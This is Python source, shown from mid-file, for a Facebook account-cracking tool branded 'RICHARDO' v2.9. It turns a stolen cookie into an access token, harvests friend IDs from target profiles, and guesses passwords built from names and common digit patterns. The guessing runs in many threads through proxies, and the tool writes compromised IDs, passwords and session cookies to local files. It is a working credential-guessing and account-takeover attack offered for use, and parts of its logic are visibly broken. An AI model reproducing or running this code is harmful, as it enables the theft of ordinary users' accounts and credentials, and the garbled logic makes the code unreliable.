    animation('(\x1b[38;5;196m>>\x1b[37m) THIS OPTION AVAILABLE IN NEXT UPDATE')
    restart()

import datetime

current_time = datetime.datetime.now()
current_hour = current_time.hour

if 5 <= current_hour < 12:
    greeting = 'GOOD MORNING    :'
elif 12 <= current_hour < 17:
    greeting = 'GOOD AFTERNOON  :'
elif 17 <= current_hour < 20:
    greeting = 'GOOD EVENING    :'
else:
    greeting = 'GOOD NIGHT     :'

print(greeting)

logo = (
    '\x1b[37m  \t\n'
    '__________.__       .__                     .___\n'
    '\\______   \\__| ____ |  |__ _____ _______  __| _/\n'
    ' |       _/  |/ ___\\|  |  \\__  \\_  __ \\/ __ | \n'
    ' |    |   \\  \\  \\___|   Y  \\/ __ \\|  | \\/ /_/ | \n'
    ' |____|_  /__|\\___  >___|  (____  /__|  \\____ | \n'
    '        \\/        \\/     \\/     \\/           \\/\x1b[38;5;196mv2.9 '
)

print(logo)

def info():
    print(
        '\x1b[37m------------------------------------------------------------\n'
        '(\x1b[38;5;196m>>\x1b[37m) DEVELOPER  : \x1b[38;5;46mRICHARDO\x1b[1;37m\n'
        '(\x1b[38;5;196m>>\x1b[37m) VERSION    : \x1b[38;5;46m2.9\x1b[38;5;46m\x1b[1;37m\n'
        '(\x1b[38;5;196m>>\x1b[37m) TOOL TYPE  : \x1b[38;5;46mFILE > PUBLIC > RANDOM\n'
        '\x1b[37m------------------------------------------------------------'
    )

def clear():
    os.system('clear')
    print(logo)

os.system('espeak -a 400 " WELCOME SIR TO richardo CLONING TOOL"')
uname = input('>> WHAT IS YOUR NAME \x1b[38;5;196m: \x1b[1;37m')

def banner():
    print(logo)


def login123():
    os.system('clear')
    banner()
    info()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m ' + greeting, uname)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAY FIX DATE  : ' + date)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR IP ADDRESS : ' + ip)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR DATA/WIFI  : ' + sim)
    linex()
    print('\x1b[1;37m[\x1b[38;5;196m1\x1b[1;97m]\x1b[1;97m CRACK PUBLIC   [\x1b[38;5;196m2\x1b[1;97m]\x1b[1;97m CRACK FILE')
    print('[\x1b[38;5;196m3\x1b[1;97m]\x1b[1;97m CRACK RANDOM   [\x1b[38;5;196m4\x1b[1;97m]\x1b[1;97m CONTACT ADMIN')
    print('[\x1b[38;5;196m5\x1b[1;97m]\x1b[1;97m FILE MAKING    [\x1b[38;5;196m0\x1b[1;97m]\x1b[1;97m EXIT TOOL ')
    linex()
    lgmt = input('CHOOSE : ')
    if lgmt == '1':
        login_lagi334()
    elif lgmt == '2':
        crack_file()
    elif lgmt == '3':
        RandomCloning()
    elif lgmt == '4':
        contact()
    elif lgmt == '5':
        soon()
    else:
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()



def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f'[\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()
         
#---------------------[COOKIE && LOGIN]----------------------#
         
def login_lagi334():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		info()
		linex()
		cookie = input(' [•] Enter Cookie : ')
		open("data/.cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open("data/.token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('[\033[1;31mx\033[1;37m]FUCK'%(p))

			except:
				linex()
				print('\033[1;37m[\033[1;31m×\033[1;37m] FUCK')

		print(f'\033[1;37m[\033[1;32m>\033[1;37m] \033[1;32mRUN AGAIN ');time.sleep(1)
		exit()
	except Exception as e:
		linex()
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		animation(f'\033[0m >> Login Token/Cookie Expired')
		print(e)
		exit()



def bot():
    requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)


def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] COOKIE EXPIRED')
		time.sleep(5)
		login()
    
    os.system('clear')
    banner()
    info()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m ' + greeting, uname)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAY FIX DATE  : ' + date)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR IP ADDRESS : ' + ip)
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m YOUR DATA/WIFI  : ' + sim)
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] CRACK PUBLIC       ')
    print('[\x1b[38;5;196m2\x1b[1;37m] CRACK FILE        ')
    print('[\x1b[38;5;196m3\x1b[1;37m] CRACK RANDOM ')
    print('[\x1b[38;5;196m4\x1b[1;37m] CHECK RESULTS      ')
    print('[\x1b[38;5;196m5\x1b[1;37m] CONTACT ADMIN')
    print('[\x1b[38;5;196m0\x1b[1;37m] EXIT TOOL')
    linex()
    
    _____cowok__pink_____ = input(' CHOOSE : ')
    if _____cowok__pink_____ == '1':
        dump_massal()
    elif _____cowok__pink_____ == '2':
        crack_file()
    elif _____cowok__pink_____ == '3':
        RandomCloning()
    elif _____cowok__pink_____ in ('4', '04'):
        result()
    elif _____cowok__pink_____ in ('5', '05'):
        contact()
    elif _____cowok__pink_____ == '0':
        os.system('rm -rf data/.token.txt')
        os.system('rm -rf .cookie.txt')
        linex()
        animation('[✓] DONE LOGOUT ')
        exit()
    else:
        animation('[×] SELECT CORRECTLY ')
        back()



def result():
    linex()
    os.system('clear')
    banner()
    linex()
    print('\x1b[1;37m[\x1b[38;5;196m1\x1b[1;37m] CHECK CP IDS')
    print('[\x1b[38;5;196m2\x1b[1;37m] CHECK OK IDS')
    print('[\x1b[38;5;196m0\x1b[1;37m] EXIT')
    linex()
    kz = input('[\x1b[38;5;196m•\x1b[1;37m] CHOOSE : ')
    if kz in ('1', '01'):
        vin = os.listdir('CP')
        if not vin:
            linex()
            animation('[\x1b[38;5;196m×\x1b[1;37m] NO CP RESULTS FOUND')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                cih += 1
                lol[str(cih)] = isi
                print(f' {cih}. {isi}')
            linex()
            geeh = input('[\x1b[38;5;196m•\x1b[1;37m] CHOOSE : ')
            linex()
            geh = lol.get(geeh)
            if not geh:
                linex()
                animation('[\x1b[38;5;196m×\x1b[1;37m] NO OPTION FOUND')
                exit()
            lin = open('CP/' + geh, 'r').read().splitlines()
            linex()
            print('[\x1b[38;5;196m×\x1b[1;37m] FILE NOT FOUND')
            time.sleep(2)
            back()
            nocp = 0
            for cpku in lin:
                cpkuni = cpku.split('|')
                print(f' [\x1b[38;5;196m•\x1b[1;37m] CP : \x1b[33m {cpkuni[0]}|{cpkuni[1]}\x1b[0m')
                nocp += 1
            linex()
            input(' >> PRESS ENTER TO GO BACK ')
            back()
    elif kz in ('2', '02'):
        vin = os.listdir('OK')
        if not vin:
            linex()
            animation('[\x1b[38;5;196m×\x1b[1;37m] NO OK RESULTS FOUND')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                cih += 1
                lol[str(cih)] = isi
                print(f' {cih}. {isi}')
            linex()
            geeh = input('[\x1b[38;5;196m•\x1b[1;37m] CHOOSE : ')
            linex()
            geh = lol.get(geeh)
            if not geh:
                linex()
                animation('[\x1b[38;5;196m×\x1b[1;37m] NO OPTION FOUND')
                exit()
            lin = open('OK/' + geh, 'r').read().splitlines()
            linex()
            print('[\x1b[38;5;196m×\x1b[1;37m] FILE NOT FOUND')
            time.sleep(2)
            back()
            nocp = 0
            for cpku in lin:
                cpkuni = cpku.split('|')
                print(f' [\x1b[38;5;196m•\x1b[1;37m] OK : \x1b[32m {cpkuni[0]}|{cpkuni[1]}\x1b[0m')
                nocp += 1
            linex()
            input(' >> PRESS ENTER TO GO BACK ')
            back()
    elif kz in ('0', '00'):
        back()
    else:
        animation('[\x1b[38;5;196m×\x1b[1;37m] NO OPTION FOUND IN MENU')
        exit()


def dump_massal():
    token = open('data/.token.txt', 'r').read()
    cok = open('data/.cok.txt', 'r').read()
    if not token or not cok:
        print(f'{m}INVALID COOKIE')
        exit()

    print('')
    try:
        dwi = int(input('[\x1b[38;5;196m>>\x1b[1;37m] ENTER TARGET AMOUNT  : '))
    except ValueError:
        exit()

    if dwi < 1 or dwi > 1000:
        exit()

    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input('[\x1b[38;5;196m>>\x1b[1;37m] INPUT UID ' + str(_dwi_) + ' : ')
        uid.append(Masukan)
        for user in uid:
            head = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'}
            params = {
                'access_token': token,
                'fields': 'friends'}

            try:
                url = requests.get('https://graph.facebook.com/{}'.format(user), params=params, headers=head,
                                   cookies={'cookies': cok}).json()

                for proses in url.get('friends', {}).get('data', []):
                    woy = proses.get('id') + '|' + proses.get('name')
                    if woy in id:
                        continue
                    id.append(woy)

            except (KeyError, IOError):
                continue

            except requests.exceptions.ConnectionError:
                print(f'{u}')
                back()
                return

            linex()
            os.system('clear')
            banner()
            info()
            print('\x1b[37m[\x1b[32m>>\x1b[37m]\x1b[37m TOTAL ID : \x1b[38;5;196m' + str(len(id)) + '\x1b[37m')
            setting()
            return

    linex()
    animation(' [×] DUMP ID FAILED ')
    time.sleep(3)
    back()


def crack_file():
    linex()
    o = input('[\x1b[38;5;196m>>\x1b[1;37m] FILE NAME : ')
    try:
        lin = open(o).read().splitlines()
    except FileNotFoundError:
        linex()
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
        return

    for xid in lin:
        id.append(xid)
        setting()
        return



def setting():
    linex()
    print('[\x1b[38;5;196m1\x1b[1;37m] CRACK OLD IDZ')
    print('[\x1b[38;5;196m2\x1b[1;37m] CRACK NEW IDZ')
    print('[\x1b[38;5;196m3\x1b[1;37m] CRACK MIX IDZ')
    linex()
    hu = input('[\x1b[38;5;196m>>\x1b[1;37m] CHOOSE : ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
            if hu in ('2', '02'):
                muda = []
                for bacot in sorted(id):
                    muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                        if hu in ('3', '03'):
                            for bacot in id:
                                xx = random.randint(0, len(id2))
                                id2.insert(xx, bacot)
                                for bacot in id:
                                    xx = random.randint(0, len(id2))
                                    id2.insert(xx, bacot)
                                    linex()
                                    print('[\x1b[38;5;196m>>\x1b[1;37m] LOGIN METHOD ')
                                    linex()
                                    print('[\x1b[38;5;196m1\x1b[1;37m] M-BASIC FACEBOOK')
                                    print('[\x1b[38;5;196m2\x1b[1;37m] FREE FACEBOOK')
                                    linex()
                                    hc = input('[\x1b[38;5;196m>>\x1b[1;37m] CHOOSE : ')
                                    if hc in ('1', '01'):
                                        method.append('mobile')
    if hc in ('4', '04'):
        method.append('free')
    method.append('mobile')
    linex()
    _____cowok__pink_____ = input('\x1b[37m(\x1b[38;5;196m>>\x1b[37m) DO YOU WANT TO SHOW CP (y/n) : ')
    if _____cowok__pink_____ in ('y', 'Y', '1'):
        akun.append('y')
    akun.append('n')
    linex()
    xxx = input('\x1b[37m(\x1b[38;5;196m>>\x1b[37m) DO YOU WANT TO SHOW CREATION DATE (y/n) : ')
    if xxx in ('y', 'Y'):
        apk_ck.append('y')
    apk_ck.append('n')
    passwrd()
    exit()


def passwrd():
    os.system('clear')
    print(logo)
    linex()
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[37m TOTAL ACCOUNT :\x1b[38;5;196m', str(len(id)))
    print('\x1b[37m(\x1b[38;5;196m>>\x1b[37m)\x1b[1;37m TODAYS DATE   : ' + date)
    linex()
    print('\x1b[1;37m(\x1b[38;5;196m>>\x1b[37m)\x1b[37m USE AIRPLANE MODE FOR MORE OK IDS\x1b[38;5;196m')
    print('\x1b[1;37m(\x1b[38;5;196m>>\x1b[37m)\x1b[37m COOKIE SAVE IN RICHARDO-OK.txt FILE\x1b[38;5;196m')
    linex()
    pool = tred(max_workers=30)
    for yuzong in id2:
        nmf = yuzong.split('|')[1].lower()
        idf = yuzong.split('|')[0]
        frs = nmf.split(' ')[0]
        pwv = []
        if len(nmf) < 6:
            if len(frs) < 3:
                continue
            pwv.append(frs + '@123')
            pwv.append(frs + '123')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
            pwv.append(nmf)
            pwv.append(frs + '@12345')
            pwv.append(frs + '456')
            pwv.append(frs + '@1234')
            pwv.append(frs + '321')
            pwv.append(frs + '@@@')
            pwv.append(frs + '123@')
            pwv.append(frs + '@321')
        if len(frs) < 3:
            pwv.append(nmf)
        pwv.append(frs + '@123')
        pwv.append(frs + '123')
        pwv.append(frs + '1234')
        pwv.append(frs + '12345')
        pwv.append(nmf)
        pwv.append(frs + '@12345')
        pwv.append(frs + '456')
        pwv.append(frs + '@1234')
        pwv.append(frs + '321')
        pwv.append(frs + '@@@')
        pwv.append(frs + '123@')
        pwv.append(frs + '@321')
        pool.submit(crack, idf, pwv)
    
    linex()
    print(' The process has completed')
    print(' Total OK/CP: {ok}/{cp}')
    linex()
    woi = input(' Press enter to back ')
    back()



def crack(idf, pwv):
    global ok, cp, loop
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'''\r\x1b[37m[RICHARDO] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  ''')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(prox)
        proxs = {'http': 'socks4://' + nip}
        link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
        data = {'bi_xrwh': 0}
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980'
        }
        po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',
                      data=data, headers=headers, allow_redirects=False, proxies=proxs)

        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = ';'.join([f'''{key!s}={value!s}''' for key, value in ses.cookies.get_dict().items()])
            print(f'''\r{P}\x1b[38;5;46m[RICHARDO-OK] {tahun(idf)} >> \x1b[38;5;46m{idf} >> {pw}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
            open('/sdcard/RICHARDO-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')

        if 'checkpoint' in po.cookies.get_dict().keys():
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            open('/sdcard/RICHARDO-CP.txt', 'a').write(idf + ' | ' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1

        if requests.exceptions.ConnectionError:
            'upgrade-insecure-requests'
            time.sleep(31)

        loop += 1



def crackfree(idf, pwv):
    global cp, ok, loop
    sys.stdout.write(f'''\r\x1b[37m[RICHARDO] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  ''')
    sys.stdout.flush()
    ua1 = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        ses.headers.update({
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'sec-ch-ua-mobile': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua1,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://p.facebook.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
        })
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw
        }
        koki = (lambda kv: ';'.join([f'''{key}={value}''' for key, value in kv.items()]))(p.cookies.get_dict())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = {
            'Host': 'www.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://p.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r{P}{K}[{time.strftime('%H:%M:%S')}-CP] {idf} │ {pw} {P}''')
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda kv: ';'.join([f'''{key}={value}''' for key, value in kv.items()]))(ses.cookies.get_dict())
            print(f'''\r{P}\x1b[38;5;46m[{time.strftime('%H:%M:%S')}-OK] {idf} │ {pw} {P}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
            ok.append(wrt)
        if requests.exceptions.ConnectionError:
            time.sleep(31)
        loop += 1



def tahun(fx):
    if len(fx) == 15:
        if fx[:10] in ('1000000000',):
            tahunz = '2009'
        if fx[:9] in ('100000000',):
            tahunz = '2009'
        if fx[:8] in ('10000000',):
            tahunz = '2009'
        if fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            tahunz = '2009'
        if fx[:7] in ('1000006', '1000007', '1000008', '1000009'):
            tahunz = '2010'
        if fx[:6] in ('100001',):
            tahunz = '2010'
        if fx[:6] in ('100002', '100003'):
            tahunz = '2011'
        if fx[:6] in ('100004',):
            tahunz = '2012'
        if fx[:6] in ('100005', '100006'):
            tahunz = '2013'
        if fx[:6] in ('100007', '100008'):
            tahunz = '2014'
        if fx[:6] in ('100009',):
            tahunz = '2015'
        if fx[:5] in ('10001',):
            tahunz = '2016'
        if fx[:5] in ('10002',):
            tahunz = '2017'
        if fx[:5] in ('10003',):
            tahunz = '2018'
        if fx[:5] in ('10004',):
            tahunz = '2019'
        if fx[:5] in ('10005',):
            tahunz = '2020'
        if fx[:5] in ('10006',):
            tahunz = '2021'
        if fx[:5] in ('10009',):
            tahunz = '2023'
        if fx[:5] in ('10007', '10008'):
            tahunz = '2022'
        tahunz = '2024'
    if len(fx) in (9, 10):
        tahunz = '2008'
    if len(fx) == 8:
        tahunz = '2007'
    if len(fx) == 7:
        tahunz = '2006'
    tahunz = '2024'
    return tahunz

bou = []
pcp = []
apk = []
import uuid
import string

def dalvik():
    application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
    application_version_code = str(random.randint(0, 999999999))
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    ua1 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=1.5,width=480,height=854};FBLC/en_US' + application_version_code + ';FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/' + str(fbs) + ';FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua2 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=1.5,width=480,height=854};FBLC/en_US' + application_version_code + ';FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/' + str(fbs) + ';FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua3 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=1.5,width=480,height=854};FBLC/en_US' + application_version_code + ';FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/' + str(fbs) + ';FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    max = random.choice([
        ua1,
        ua2,
        ua3])
    return str(max)


def RandomCloning():
    os.system('clear')
    banner()
    linex()
    print('\x1b[37m[+] EXAMPLE   : 9816,etc')
    code = input('[+] SIM CODE  : ')
    linex()
    limit = int(input('[+] EXAMPLE   : 5000,1000,15000\n[+] CRACK ID  : '))
    linex()
    limit = 5000  # Resetting limit to a fixed value, change if necessary
    for a in range(limit):
        awm = ''.join(random.choice(string.digits) for _ in range(6))
        bou.append(awm)
        cpp = input('[+] SHOW CHECKPOINT ID [Y/N] : ')
        linex()
        if cpp in ('n', 'N', 'NO'):
            pcp.append('n')
        else:
            pcp.append('y')
    app = input('[+] SHOW APK && WEBSITE [Y/N] : ')
    linex()
    if app in ('N', 'n', 'No', 'NO'):
        apk.append('n')
    else:
        apk.append('y')
    AwmZone = tred(max_workers=15)
    os.system('clear')
    banner()
    linex()
    print('\x1b[37m[+] TOTAL ID : \x1b[32m', str(len(bou)))
    print('\x1b[37m[+] USE AIRPLANE MODE FOR GOOD RESULT')
    linex()
    for love in bou:
        ids = code + love
        passlist = [
            ids[:6],
            ids[:7],
            ids[:8],
            love,
            ids[2:],
            ids[3:],
            'nepal123',
            'nepal1234',
            'nepal12345',
            'nepal@123',
            'maya123',
            'kathmandu',
            'pokhara',
            'tamang',
            'tamang123',
            'iloveyou']
        AwmZone.submit(cracker, ids, passlist)


def cracker(ids, passlist):
    global ok, cp, loop
    sys.stdout.write(f'''\r\r\x1b[37m[RICHARDO] {loop}|RANDOM \x1b[38;5;46m[OK-:{ok}]''')
    sys.stdout.flush()
    for pas in passlist:
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        head = {
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9' }
        po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head, verify=True).json()
        if 'access_token' in po:
            uid = str(po['uid'])
            ckkk = ';'.join(f"{i['name']}={i['value']}" for i in po['session_cookies'])
            ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            coki = f'''sb={ssbb};{ckkk}'''
            print(f'''\r\r\x1b[38;5;46m[RICHARDO-OK] {uid} | {pas}''')
            if 'y' in apk:
                print(f'''\r\r[COOKIE] {coki}''')
                check_apk(coki)
            open('/sdcard/RICHARDO-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
            ok += 1
            jonex(uid, pas, coki)
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;196m [RICHARDO-CP] {ids} | {pas}''')
            open('/sdcard/RICHARDO-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cp += 1
        loop += 1


if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

